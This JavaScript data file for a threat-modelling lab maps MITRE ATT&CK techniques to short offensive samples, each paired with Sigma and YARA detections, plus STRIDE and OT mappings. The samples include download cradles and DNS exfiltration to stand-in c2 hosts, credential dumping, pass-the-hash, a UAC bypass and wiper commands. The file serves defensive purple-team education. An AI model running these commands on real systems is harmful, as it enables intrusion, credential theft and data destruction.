/* =======================================================================
   Threat Model Lab — knowledge base
   -----------------------------------------------------------------------
   MITRE ATT&CK techniques, each paired with an offensive sample (attack /
   payload) and defensive detections (Sigma + YARA), plus STRIDE-LM and
   Purdue mappings that drive threat generation.

   Content mirrors publicly documented tradecraft (MITRE ATT&CK, Atomic Red
   Team, the Sigma and YARA rule projects). Provided for AUTHORISED security
   testing, purple-team and education only; every offensive sample ships
   with its detection. Exposed as window.TLAB.
   ===================================================================== */
window.TLAB = (function () {
  const R = String.raw; // keep backslashes / regex literal inside code blocks

  /* ── STRIDE-LM categories ──────────────────────────────────────────── */
  const STRIDE_LM = {
    S: { name: "Spoofing", prop: "Authentication" },
    T: { name: "Tampering", prop: "Integrity" },
    R: { name: "Repudiation", prop: "Non-repudiation" },
    I: { name: "Information Disclosure", prop: "Confidentiality" },
    D: { name: "Denial of Service", prop: "Availability" },
    E: { name: "Elevation of Privilege", prop: "Authorization" },
    L: { name: "Lateral Movement", prop: "Segmentation" },
  };

  // Kill-chain order for the RAPID (tactic-grouped) view.
  const TACTIC_ORDER = [
    "Reconnaissance", "Resource Development", "Initial Access", "Execution",
    "Persistence", "Privilege Escalation", "Defense Evasion", "Credential Access",
    "Discovery", "Lateral Movement", "Collection", "Command and Control",
    "Exfiltration", "Impact",
  ];

  /* ── Technique library ─────────────────────────────────────────────── */
  // id → { name, tactic, attack:{note,lang,code}, sigma, yara? }
  const TECH = {
    "T1566.001": {
      name: "Phishing: Spearphishing Attachment", tactic: "Initial Access",
      attack: {
        note: "Macro/HTA lure delivering a stager — authorised phishing simulation (GoPhish + pretext).",
        lang: "vbnet",
        code: R`' Office VBA (AutoOpen) — stager download cradle
Sub AutoOpen()
  Dim sh As Object: Set sh = CreateObject("WScript.Shell")
  sh.Run "powershell -nop -w hidden -c ""IEX(New-Object " & _
         "Net.WebClient).DownloadString('http://c2.example/s.ps1')""", 0
End Sub`,
      },
      sigma: R`title: Office Application Spawning Script Interpreter
logsource: { category: process_creation, product: windows }
detection:
  selection:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
    Image|endswith:
      - '\powershell.exe'
      - '\cmd.exe'
      - '\wscript.exe'
      - '\mshta.exe'
  condition: selection
level: high`,
      yara: R`rule Maldoc_AutoOpen_Shell {
  strings:
    $a = "AutoOpen" ascii nocase
    $b = "WScript.Shell" ascii nocase
    $c = "DownloadString" ascii nocase
  condition: 2 of them
}`,
    },

    "T1078": {
      name: "Valid Accounts", tactic: "Initial Access",
      attack: {
        note: "Low-and-slow password spray (one password, many users) against on-prem AD or Entra ID.",
        lang: "bash",
        code: R`# Kerberos pre-auth spray (on-prem)
kerbrute passwordspray -d corp.local --dc 10.0.0.10 users.txt 'Autumn2026!'

# Entra ID / M365 spray
python3 MSOLSpray.py --userlist users.txt --password 'Autumn2026!'`,
      },
      sigma: R`title: Password Spraying - Many Accounts From One Source
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4625
  timeframe: 10m
  condition: selection | count(TargetUserName) by IpAddress > 10
level: high`,
    },

    "T1190": {
      name: "Exploit Public-Facing Application", tactic: "Initial Access",
      attack: {
        note: "Web injection classes an external process exposes — SQLi, SSRF to cloud metadata, Java deserialisation.",
        lang: "bash",
        code: R`# SQL injection — auth bypass then UNION extraction
' OR 1=1-- -
' UNION SELECT username,password,3 FROM users-- -
sqlmap -u "https://app/item?id=1" --batch --risk 3 --level 5 --dbs

# SSRF -> IMDSv1 cloud credential theft
curl "https://app/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Java deserialisation RCE
java -jar ysoserial.jar CommonsCollections6 'curl http://c2/x|bash' | base64`,
      },
      sigma: R`title: Web Exploitation Indicators in Access Log
logsource: { category: webserver }
detection:
  sqli:
    c-uri|contains|all: ['UNION', 'SELECT']
  ssrf:
    c-uri|contains: '169.254.169.254'
  tool:
    c-useragent|contains: 'sqlmap'
  condition: sqli or ssrf or tool
level: high`,
      yara: R`rule Webshell_Generic {
  strings:
    $php = /eval\s*\(\s*\$_(POST|GET|REQUEST)/ nocase
    $jsp = "Runtime.getRuntime().exec" ascii
    $asp = /eval\s*\(\s*Request/ nocase
  condition: any of them
}`,
    },

    "T1557.001": {
      name: "LLMNR/NBT-NS Poisoning and SMB Relay", tactic: "Credential Access",
      attack: {
        note: "Poison name resolution to capture NetNTLMv2, then crack or relay.",
        lang: "bash",
        code: R`# Capture NetNTLMv2 by answering LLMNR/NBT-NS/mDNS
sudo responder -I eth0 -wdv

# Relay to hosts without SMB signing instead of cracking
ntlmrelayx.py -tf targets.txt -smb2support

# Offline crack
hashcat -m 5600 captured.txt rockyou.txt`,
      },
      sigma: R`title: Possible Responder Activity (LLMNR/NBNS)
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: 'NTLM'
  filter:
    WorkstationName|startswith: 'DC'
  condition: selection and not filter
level: medium`,
    },

    "T1558.003": {
      name: "Kerberoasting", tactic: "Credential Access",
      attack: {
        note: "Request service tickets for SPN accounts and crack offline — any domain user can do this.",
        lang: "bash",
        code: R`# Impacket
GetUserSPNs.py -request -dc-ip 10.0.0.10 corp.local/lowpriv:'P@ss' -outputfile spns.txt

# Rubeus (on host)
Rubeus.exe kerberoast /nowrap

# Crack (mode 13100 = Kerberos 5 TGS-REP RC4)
hashcat -m 13100 spns.txt rockyou.txt`,
      },
      sigma: R`title: Kerberoasting - RC4 TGS Request
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'   # RC4-HMAC
    TicketOptions: '0x40810000'
  filter:
    ServiceName|endswith: '$'
  condition: selection and not filter
level: high`,
    },

    "T1003.001": {
      name: "OS Credential Dumping: LSASS Memory", tactic: "Credential Access",
      attack: {
        note: "Dump LSASS, parse offline. comsvcs.dll is a signed LOLBIN; nanodump avoids a touched handle.",
        lang: "powershell",
        code: R`# LOLBIN MiniDump via comsvcs.dll
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\t\l.dmp full

# or procdump
procdump.exe -accepteula -ma lsass.exe C:\t\l.dmp

# Parse offline
mimikatz # sekurlsa::minidump C:\t\l.dmp
mimikatz # sekurlsa::logonpasswords`,
      },
      sigma: R`title: LSASS Memory Access (Credential Dump)
logsource: { product: windows, category: process_access }
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess:
      - '0x1010'
      - '0x1410'
      - '0x1438'
  condition: selection
level: high`,
      yara: R`rule Mimikatz_Indicators {
  strings:
    $a = "sekurlsa::logonpasswords" ascii wide
    $b = "gentilkiwi" ascii wide
    $c = "wdigest" ascii wide nocase
  condition: 2 of them
}`,
    },

    "T1003.006": {
      name: "OS Credential Dumping: DCSync", tactic: "Credential Access",
      attack: {
        note: "Abuse replication rights to pull password hashes (incl. krbtgt) without touching a DC's disk.",
        lang: "bash",
        code: R`# Impacket
secretsdump.py -just-dc corp.local/da:'P@ss'@10.0.0.10

# Mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt`,
      },
      sigma: R`title: DCSync Replication From Non-DC Account
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4662
    Properties|contains: '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes
  filter:
    SubjectUserName|endswith: '$'   # legitimate machine/DC accounts
  condition: selection and not filter
level: critical`,
    },

    "T1550.002": {
      name: "Use Alternate Auth Material: Pass-the-Hash", tactic: "Lateral Movement",
      attack: {
        note: "Authenticate with an NTLM hash — no plaintext needed.",
        lang: "bash",
        code: R`psexec.py -hashes :<NTLM> corp.local/Administrator@10.0.0.20
evil-winrm -i 10.0.0.20 -u Administrator -H <NTLM>
crackmapexec smb 10.0.0.0/24 -u Administrator -H <NTLM> --local-auth`,
      },
      sigma: R`title: Pass-the-Hash (Logon Type 9 + Seclogo)
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4624
    LogonType: 9
    LogonProcessName: 'seclogo'
    AuthenticationPackageName: 'Negotiate'
  condition: selection
level: high`,
    },

    "T1021.002": {
      name: "Remote Services: SMB/Admin Shares (PsExec)", tactic: "Lateral Movement",
      attack: {
        note: "Service-based remote execution over ADMIN$ — the classic PsExec pattern.",
        lang: "bash",
        code: R`psexec.py corp.local/admin:'P@ss'@10.0.0.20 cmd.exe
smbexec.py corp.local/admin:'P@ss'@10.0.0.20`,
      },
      sigma: R`title: PsExec Service Installation
logsource: { product: windows, service: system }
detection:
  selection:
    EventID: 7045
    ServiceName: 'PSEXESVC'
  anyexe:
    EventID: 7045
    ServiceFileName|contains: '\\PSEXESVC'
  condition: selection or anyexe
level: high`,
      yara: R`rule PsExec_Service {
  strings:
    $a = "PSEXESVC" ascii wide
    $b = "\\\\.\\pipe\\psexesvc" ascii wide nocase
  condition: any of them
}`,
    },

    "T1047": {
      name: "Windows Management Instrumentation", tactic: "Execution",
      attack: {
        note: "Fileless remote execution via WMI — no service artifact.",
        lang: "bash",
        code: R`wmiexec.py corp.local/admin:'P@ss'@10.0.0.20
# native
wmic /node:10.0.0.20 /user:admin process call create "cmd /c calc.exe"`,
      },
      sigma: R`title: WMI Provider Spawning a Shell
logsource: { category: process_creation, product: windows }
detection:
  selection:
    ParentImage|endswith: '\WmiPrvSE.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
  condition: selection
level: high`,
    },

    "T1059.001": {
      name: "Command and Scripting Interpreter: PowerShell", tactic: "Execution",
      attack: {
        note: "Obfuscated / encoded download cradle — the most common post-exploitation launcher.",
        lang: "powershell",
        code: R`powershell -nop -w hidden -enc <base64-command>
IEX (New-Object Net.WebClient).DownloadString('http://c2/a.ps1')
powershell -c "IEX(IWR -UseBasicParsing http://c2/a.ps1)"`,
      },
      sigma: R`title: Suspicious PowerShell Script Block
logsource: { product: windows, service: powershell }
detection:
  selection:
    EventID: 4104
    ScriptBlockText|contains:
      - 'FromBase64String'
      - 'DownloadString'
      - 'IEX ('
      - '-enc '
  condition: selection
level: high`,
      yara: R`rule PowerShell_DownloadCradle {
  strings:
    $a = "DownloadString" ascii wide nocase
    $b = "FromBase64String" ascii wide nocase
    $c = "-enc" ascii wide nocase
    $d = "IEX" ascii wide
  condition: 2 of them
}`,
    },

    "T1055": {
      name: "Process Injection", tactic: "Defense Evasion",
      attack: {
        note: "Classic remote-thread injection API sequence (illustrative — no shellcode provided).",
        lang: "c",
        code: R`// VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID m = VirtualAllocEx(p, NULL, sz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(p, m, payload, sz, NULL);
CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)m, NULL, 0, NULL);`,
      },
      sigma: R`title: Remote Thread Injection (Sysmon 8)
logsource: { product: windows, category: create_remote_thread }
detection:
  selection:
    EventID: 8
  filter:
    SourceImage|endswith: '\msbuild.exe'   # tune per environment
  condition: selection
level: high`,
      yara: R`rule Injection_API_Combo {
  strings:
    $a = "VirtualAllocEx"
    $b = "WriteProcessMemory"
    $c = "CreateRemoteThread"
  condition: all of them
}`,
    },

    "T1053.005": {
      name: "Scheduled Task", tactic: "Persistence",
      attack: {
        note: "Persist (and often escalate to SYSTEM) via a scheduled task.",
        lang: "powershell",
        code: R`schtasks /create /tn "Updater" /ru SYSTEM /sc onlogon ^
  /tr "powershell -nop -w hidden -enc <base64>"`,
      },
      sigma: R`title: Scheduled Task Creation
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4698
  cmdline:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains: '/create'
  condition: selection or cmdline
level: medium`,
    },

    "T1547.001": {
      name: "Registry Run Keys / Startup Folder", tactic: "Persistence",
      attack: {
        note: "User-level persistence via a Run key.",
        lang: "powershell",
        code: R`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
  /v Updater /d "C:\Users\Public\s.exe" /f`,
      },
      sigma: R`title: Registry Run Key Modification
logsource: { product: windows, category: registry_set }
detection:
  selection:
    TargetObject|contains: '\CurrentVersion\Run'
  condition: selection
level: medium`,
    },

    "T1548.002": {
      name: "Abuse Elevation Control: Bypass UAC", tactic: "Privilege Escalation",
      attack: {
        note: "fodhelper.exe auto-elevates and reads a hijackable HKCU key.",
        lang: "powershell",
        code: R`reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd /c payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f
fodhelper.exe`,
      },
      sigma: R`title: UAC Bypass via fodhelper / ms-settings Hijack
logsource: { product: windows, category: registry_set }
detection:
  selection:
    TargetObject|contains: '\ms-settings\Shell\Open\command'
  condition: selection
level: high`,
    },

    "T1068": {
      name: "Exploitation for Privilege Escalation", tactic: "Privilege Escalation",
      attack: {
        note: "Local kernel/driver exploit after a foothold (authorised lab).",
        lang: "bash",
        code: R`# enumerate local privesc paths
./linpeas.sh | tee linpeas.txt
.\winPEASx64.exe

# metasploit local exploit suggester
use post/multi/recon/local_exploit_suggester`,
      },
      sigma: R`title: Possible Local Privilege Escalation Tooling
logsource: { category: process_creation, product: windows }
detection:
  selection:
    Image|endswith:
      - '\winPEAS.exe'
      - '\PrintSpoofer.exe'
      - '\GodPotato.exe'
  condition: selection
level: high`,
    },

    "T1486": {
      name: "Data Encrypted for Impact (Ransomware)", tactic: "Impact",
      attack: {
        note: "No encryptor is provided. Shown: the recovery-inhibition steps defenders detect pre-encryption.",
        lang: "powershell",
        code: R`vssadmin delete shadows /all /quiet
wbadmin delete catalog -quiet
bcdedit /set {default} recoveryenabled no`,
      },
      sigma: R`title: Shadow Copy / Backup Deletion (Ransomware Precursor)
logsource: { category: process_creation, product: windows }
detection:
  vss:
    Image|endswith: '\vssadmin.exe'
    CommandLine|contains|all: ['delete', 'shadows']
  bcd:
    Image|endswith: '\bcdedit.exe'
    CommandLine|contains: 'recoveryenabled no'
  condition: vss or bcd
level: critical`,
      yara: R`rule Ransom_Note_Heuristic {
  strings:
    $a = "your files have been encrypted" ascii wide nocase
    $b = "bitcoin" ascii wide nocase
    $c = ".onion" ascii wide nocase
  condition: 2 of them
}`,
    },

    "T1048.003": {
      name: "Exfiltration Over Alternative Protocol: DNS", tactic: "Exfiltration",
      attack: {
        note: "Chunk + encode data into DNS labels resolved by an attacker-controlled nameserver.",
        lang: "bash",
        code: R`# naive chunked exfil
for c in $(base32 secret.bin | tr -d '=' | fold -w40); do
  dig +short "$c.exfil.c2.example" @ns.c2.example
done

# tunnelling frameworks
iodine -f -P s3cr3t t.c2.example
dnscat2-client --dns server=ns.c2.example,domain=t.c2.example`,
      },
      sigma: R`title: DNS Tunnelling / Exfiltration
logsource: { category: dns }
detection:
  selection:
    QueryType: ['TXT', 'NULL', 'A']
  condition: selection | count() by QueryName > 100
  # also hunt: avg label length > 40 or high Shannon entropy
level: high`,
    },

    "T1498": {
      name: "Network Denial of Service", tactic: "Impact",
      attack: {
        note: "Volumetric / protocol flood against an exposed gateway or channel.",
        lang: "bash",
        code: R`hping3 -S --flood -p 443 10.0.0.5          # SYN flood
slowloris 10.0.0.5 --sockets 5000           # slow HTTP`,
      },
      sigma: R`title: SYN Flood Threshold
logsource: { category: firewall }
detection:
  selection:
    tcp_flags: 'S'
  condition: selection | count() by src_ip > 2000
  timeframe: 1m
level: medium`,
    },

    "T1499": {
      name: "Endpoint Denial of Service", tactic: "Impact",
      attack: {
        note: "Application-layer resource exhaustion against a process/service.",
        lang: "bash",
        code: R`# connection-exhaustion / slow-read against the app tier
slowhttptest -c 8000 -X -g -u https://app.example/
# algorithmic complexity abuse (e.g. hash-DoS, zip bomb upload)`,
      },
      sigma: R`title: Web App Connection Exhaustion
logsource: { category: webserver }
detection:
  selection:
    sc-status: 503
  condition: selection | count() by cs-host > 500
  timeframe: 5m
level: medium`,
    },

    "T1040": {
      name: "Network Sniffing", tactic: "Credential Access",
      attack: {
        note: "Capture cleartext / relayable material on a shared or mirrored segment.",
        lang: "bash",
        code: R`tcpdump -i eth0 -w cap.pcap 'port 80 or port 23 or port 21'
# extract creds / strings
ngrep -I cap.pcap -q -W byline 'USER|PASS'`,
      },
      sigma: R`title: Network Interface Entered Promiscuous Mode
logsource: { product: linux, service: auditd }
detection:
  selection:
    type: 'ANOM_PROMISCUOUS'
  condition: selection
level: medium`,
    },

    "T1530": {
      name: "Data from Cloud Storage", tactic: "Collection",
      attack: {
        note: "Enumerate and pull from exposed / mis-permissioned object storage.",
        lang: "bash",
        code: R`aws s3 ls s3://corp-backups --no-sign-request
aws s3 sync s3://corp-backups ./loot --no-sign-request`,
      },
      sigma: R`title: Anomalous S3 Bulk Download
logsource: { product: aws, service: cloudtrail }
detection:
  selection:
    eventName: ['GetObject', 'ListObjects']
  condition: selection | count() by sourceIPAddress > 1000
  timeframe: 10m
level: high`,
    },

    "T1621": {
      name: "Multi-Factor Authentication Request Generation", tactic: "Credential Access",
      attack: {
        note: "MFA fatigue / push-bombing after valid-password capture until a victim approves.",
        lang: "bash",
        code: R`# repeat auth to spam push prompts until approval (AiTM also bypasses MFA)
while true; do python3 push_spam.py -u victim -p 'Captur3d!'; sleep 25; done`,
      },
      sigma: R`title: MFA Push Bombing
logsource: { product: azure, service: signinlogs }
detection:
  denied:
    ResultType: '500121'   # MFA denied
  condition: denied | count() by UserPrincipalName > 5
  timeframe: 10m
level: high`,
    },

    "T1485": {
      name: "Data Destruction", tactic: "Impact",
      attack: {
        note: "Irrecoverable wipe of data stores (wiper behaviour).",
        lang: "bash",
        code: R`cipher /w:C:\              # Windows free-space wipe
dd if=/dev/zero of=/dev/sdb bs=1M   # raw device overwrite`,
      },
      sigma: R`title: Mass File Wipe / Raw Device Overwrite
logsource: { category: process_creation }
detection:
  win:
    Image|endswith: '\cipher.exe'
    CommandLine|contains: '/w'
  nix:
    CommandLine|contains|all: ['dd ', 'of=/dev/']
  condition: win or nix
level: high`,
    },

    "T1565": {
      name: "Data Manipulation", tactic: "Impact",
      attack: {
        note: "Unauthorised modification of stored records to affect integrity-dependent decisions.",
        lang: "sql",
        code: R`UPDATE payments SET status='SETTLED' WHERE id=4417;   -- tamper
-- defeat tamper-evidence by editing/rotating logs after the change`,
      },
      sigma: R`title: Direct DML Outside Application Account
logsource: { product: database, category: audit }
detection:
  selection:
    statement|startswith: ['UPDATE', 'DELETE']
  filter:
    db_user: 'app_svc'
  condition: selection and not filter
level: medium`,
    },

    "T1210": {
      name: "Exploitation of Remote Services", tactic: "Lateral Movement",
      attack: {
        note: "Exploit an unpatched internal service to move laterally (authorised lab, e.g. MS17-010).",
        lang: "bash",
        code: R`use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.30
run`,
      },
      sigma: R`title: SMB Exploit Pattern (EternalBlue)
logsource: { category: ids }
detection:
  selection:
    signature|contains: ['ETERNALBLUE', 'DoublePulsar', 'Trans2 ']
  condition: selection
level: critical`,
    },

    "T1133": {
      name: "External Remote Services", tactic: "Initial Access",
      attack: {
        note: "Abuse an exposed VPN/RDP/gateway with valid or sprayed credentials.",
        lang: "bash",
        code: R`crackmapexec rdp 203.0.113.10 -u users.txt -p 'Autumn2026!'
# or authenticate to an exposed SSL-VPN portal with captured creds`,
      },
      sigma: R`title: External Remote Service Logon From New Geo
logsource: { product: vpn }
detection:
  selection:
    action: 'login_success'
  condition: selection   # correlate with impossible-travel / new ASN
level: medium`,
    },
  };

  /* ── Component library (IT / general) ──────────────────────────────── */
  // type → { label, icon, stride: { <letter>: { t, m, ttps:[] } } }
  const COMPONENTS = {
    external: {
      label: "External Entity", icon: "user",
      stride: {
        S: { t: "The entity is impersonated to gain trust or access.", m: "Phishing-resistant MFA, verified identities, device trust.", ttps: ["T1566.001", "T1078"] },
        R: { t: "The entity denies performing an action.", m: "Strong auth bound to tamper-evident, time-synced logs.", ttps: [] },
      },
    },
    process: {
      label: "Process / Service / API", icon: "cpu",
      stride: {
        S: { t: "An attacker spoofs the service to clients or peers (AiTM).", m: "mTLS, HSTS, signed tokens, certificate pinning.", ttps: ["T1557.001"] },
        T: { t: "Inputs are injected to exploit the public-facing app.", m: "Input validation, parameterised queries, WAF, patch SLAs.", ttps: ["T1190"] },
        I: { t: "The app discloses secrets or other users' data.", m: "Least privilege, secrets manager, output encoding, authz checks.", ttps: ["T1190"] },
        D: { t: "The service is exhausted and stops serving requests.", m: "Rate limiting, autoscaling, timeouts, resource quotas.", ttps: ["T1499"] },
        E: { t: "A flaw is exploited to run with higher privilege.", m: "Least privilege, sandboxing, patch management.", ttps: ["T1068"] },
        L: { t: "The service is used as a pivot into internal systems.", m: "Egress control, segmentation, service-identity scoping.", ttps: ["T1210"] },
      },
    },
    datastore: {
      label: "Data Store (DB / bucket / file)", icon: "db",
      stride: {
        T: { t: "Stored records are modified without authorisation.", m: "Access control, HMAC/checksums, immutable or audited writes.", ttps: ["T1565"] },
        I: { t: "Stored sensitive data is read or exfiltrated.", m: "Encryption at rest, field-level authz, data classification.", ttps: ["T1530"] },
        D: { t: "Data is destroyed or made unavailable.", m: "Immutable backups, versioning, replication, recovery tests.", ttps: ["T1485", "T1486"] },
      },
    },
    dataflow: {
      label: "Data Flow (request / channel)", icon: "flow",
      stride: {
        T: { t: "Data in transit is modified (man-in-the-middle).", m: "TLS 1.2+/1.3, message signing, integrity verification.", ttps: ["T1557.001"] },
        I: { t: "Sensitive data is intercepted on the wire.", m: "Encrypt in transit, minimise data, segment the network.", ttps: ["T1040"] },
        D: { t: "The channel is flooded or disrupted.", m: "DDoS protection, redundancy, QoS, circuit breakers.", ttps: ["T1498"] },
      },
    },
    identity: {
      label: "Identity / IdP / AD / PAM", icon: "key",
      stride: {
        S: { t: "Tickets or tokens are forged or stolen to impersonate users.", m: "Strong SPN passwords/gMSA, AES-only, short token TTLs, PAM.", ttps: ["T1558.003", "T1550.002", "T1621"] },
        I: { t: "Credential material is dumped from the directory.", m: "Tiered admin model, LSASS protection (RunAsPPL), audit replication.", ttps: ["T1003.001", "T1003.006"] },
        E: { t: "Accounts or policy are manipulated to gain rights.", m: "Least privilege, JIT/PIM, monitor privileged group changes.", ttps: ["T1621"] },
        L: { t: "Captured material is replayed across hosts.", m: "Credential tiering, PtH-resistant logon, LAPS.", ttps: ["T1550.002", "T1021.002"] },
      },
    },
    host: {
      label: "Host / Server / VM / Container", icon: "server",
      stride: {
        T: { t: "Code execution and persistence are established on the host.", m: "App allow-listing, EDR, task/registry auditing, signed binaries.", ttps: ["T1059.001", "T1047", "T1053.005", "T1547.001", "T1055"] },
        I: { t: "Credentials and data are harvested from memory/disk.", m: "RunAsPPL, Credential Guard, least privilege, DLP.", ttps: ["T1003.001"] },
        D: { t: "The host's data is encrypted or destroyed for impact.", m: "Immutable backups, canary files, shadow-copy protection.", ttps: ["T1486"] },
        E: { t: "A local flaw or misconfig is abused to reach SYSTEM/root.", m: "Patch, remove local admin, UAC at max, service hardening.", ttps: ["T1548.002", "T1068"] },
        L: { t: "The host is used to move laterally and exfiltrate.", m: "Host firewall, segmentation, egress monitoring.", ttps: ["T1021.002", "T1550.002", "T1048.003"] },
      },
    },
    network: {
      label: "Network (gateway / LB / FW / VPN)", icon: "network",
      stride: {
        S: { t: "Name resolution or auth is poisoned / relayed at the edge.", m: "Disable LLMNR/NBT-NS, SMB signing, 802.1X, mutual auth.", ttps: ["T1557.001"] },
        D: { t: "The exposed edge is flooded off-line.", m: "Upstream DDoS scrubbing, rate limits, anycast, failover.", ttps: ["T1498"] },
        E: { t: "An exposed remote service is exploited for entry.", m: "MFA on all remote access, patch edge appliances, geo/ASN controls.", ttps: ["T1133", "T1210"] },
      },
    },
  };

  const IT_TYPE_ORDER = ["external", "process", "dataflow", "datastore", "identity", "host", "network"];

  /* ── OT / ICS Purdue model (ATT&CK for ICS) ────────────────────────── */
  // Kept at technique + mitigation depth by design: ICS payloads that act on
  // a physical process are not published here.
  const PURDUE = {
    level0: { label: "Level 0 — Field Devices (sensors / actuators)", threats: [
      { id: "T0831", name: "Manipulation of Control", tactic: "Impair Process Control", t: "Field I/O is driven outside safe bounds.", m: "Independent Safety Instrumented System (SIS), physical access control, integrity checks." },
      { id: "T0856", name: "Spoof Reporting Message", tactic: "Impair Process Control", t: "Falsified telemetry misleads operators and logic.", m: "Out-of-band verification, redundant sensing, authenticated field protocols where supported." },
    ]},
    level1: { label: "Level 1 — Basic Control (PLC / RTU / IED)", threats: [
      { id: "T0836", name: "Modify Parameter", tactic: "Impair Process Control", t: "Setpoints are altered to cause unsafe operation.", m: "Controller change management, parameter allow-listing, key-switch in RUN (IEC 62443 SR 3.4)." },
      { id: "T0843", name: "Program Download", tactic: "Lateral Movement / Execution", t: "Malicious control logic is downloaded to the controller.", m: "Disable remote programming, EWS hardening, signed logic, physical key-switch." },
      { id: "T0839", name: "Module Firmware", tactic: "Persistence", t: "A firmware implant persists on the controller.", m: "Signed firmware, supply-chain verification, firmware integrity monitoring." },
    ]},
    level2: { label: "Level 2 — Supervisory (SCADA / HMI)", threats: [
      { id: "T0822", name: "External Remote Services", tactic: "Initial Access", t: "Remote access to HMI/SCADA is abused for entry.", m: "Broker all remote access via IDMZ jump host, phishing-resistant MFA, session recording." },
      { id: "T0855", name: "Unauthorized Command Message", tactic: "Impair Process Control", t: "Rogue commands are issued over control protocols.", m: "Protocol-aware firewall/DPI, command authentication, zone-and-conduit allow-listing." },
      { id: "T0829", name: "Loss of View", tactic: "Impact", t: "Operators lose visibility of process state.", m: "HMI redundancy, alarm-integrity monitoring, independent monitoring path." },
    ]},
    level3: { label: "Level 3 — Site Operations (Historian / EWS)", threats: [
      { id: "T0859", name: "Valid Accounts", tactic: "Lateral Movement", t: "Stolen credentials are used on the EWS or historian.", m: "Least privilege, PAM, MFA, EWS patching, credential vaulting." },
      { id: "T0882", name: "Theft of Operational Information", tactic: "Collection / Exfiltration", t: "Historian / process data is exfiltrated.", m: "Data classification, egress monitoring, encryption, DLP at the IT/OT boundary." },
      { id: "T0867", name: "Lateral Tool Transfer", tactic: "Lateral Movement", t: "Tooling is staged toward the control network.", m: "Application allow-listing, segmentation, EDR on L3 assets." },
    ]},
    level35: { label: "Level 3.5 — Industrial DMZ (IDMZ)", threats: [
      { id: "T0884", name: "Connection Proxy", tactic: "Command and Control", t: "The adversary pivots through a DMZ broker between IT and OT.", m: "Strict firewall conduits, data diodes / unidirectional gateways, no direct L4->L2 paths." },
      { id: "T0886", name: "Remote Services", tactic: "Lateral Movement", t: "DMZ remote services bridge IT and OT.", m: "Broker and monitor all crossings; enforce the IDMZ as the only path." },
    ]},
    level4: { label: "Level 4 / 5 — Enterprise IT", threats: [
      { id: "T1566", name: "Phishing", tactic: "Initial Access", t: "Enterprise IT is compromised to pivot toward OT.", m: "Phishing-resistant MFA, awareness, email gateway controls." },
      { id: "T1190", name: "Exploit Public-Facing Application", tactic: "Initial Access", t: "An internet-facing service is the entry point.", m: "Patch/vuln management, WAF, strict IT/OT segmentation." },
    ]},
  };
  const OT_ORDER = ["level4", "level35", "level3", "level2", "level1", "level0"];
  const SAMPLE_OT = { system: "Water Treatment SCADA", comps: [
    { type: "level4", name: "Corporate Active Directory" },
    { type: "level35", name: "IDMZ Jump Host" },
    { type: "level3", name: "Process Historian" },
    { type: "level2", name: "Treatment SCADA / HMI" },
    { type: "level1", name: "Dosing PLC" },
    { type: "level0", name: "Chlorine Dosing Pump" },
  ]};

  /* ── Samples for the IT engine ─────────────────────────────────────── */
  const SAMPLE_IT = { system: "Customer Payment Portal", comps: [
    { type: "external", name: "Cardholder (browser)" },
    { type: "network", name: "WAF / API Gateway" },
    { type: "process", name: "Payment API" },
    { type: "dataflow", name: "API → Payment Gateway" },
    { type: "datastore", name: "Transactions DB" },
    { type: "identity", name: "Entra ID (SSO)" },
    { type: "host", name: "API Container Host" },
  ]};

  /* ── Diagram type inference (keyword → component type) ──────────────── */
  const TYPE_HINTS = [
    ["datastore", /\b(db|database|sql|postgres|mysql|mariadb|mongo|redis|cache|bucket|s3|blob|storage|datastore|data store|table|warehouse|cosmos|dynamo|elastic|queue|kafka|topic|bus)\b/i],
    ["identity", /\b(auth|idp|identity|ldap|active directory|\bad\b|entra|azure ad|okta|keycloak|oauth|sso|saml|pam|vault|kerberos|kdc|token)\b/i],
    ["network", /\b(gateway|api gateway|load ?balancer|\blb\b|firewall|waf|reverse ?proxy|proxy|vpn|cdn|ingress|router|edge|dns)\b/i],
    ["host", /\b(server|host|\bvm\b|virtual machine|container|docker|pod|node|workstation|endpoint|ec2|compute|kubernetes|k8s|cluster|bastion|jump)\b/i],
    ["external", /\b(user|users|client|browser|customer|consumer|third[- ]?party|3rd|partner|vendor|external|actor|internet|public|mobile app|attacker)\b/i],
    ["process", /\b(service|api|app|application|micro ?service|function|lambda|worker|backend|frontend|server-side|process|engine|handler|portal)\b/i],
  ];
  function inferType(label) {
    const s = String(label || "");
    for (const [type, re] of TYPE_HINTS) if (re.test(s)) return type;
    return "process";
  }

  return {
    STRIDE_LM, TACTIC_ORDER, TECH, COMPONENTS, IT_TYPE_ORDER,
    PURDUE, OT_ORDER, SAMPLE_OT, SAMPLE_IT, inferType,
  };
})();
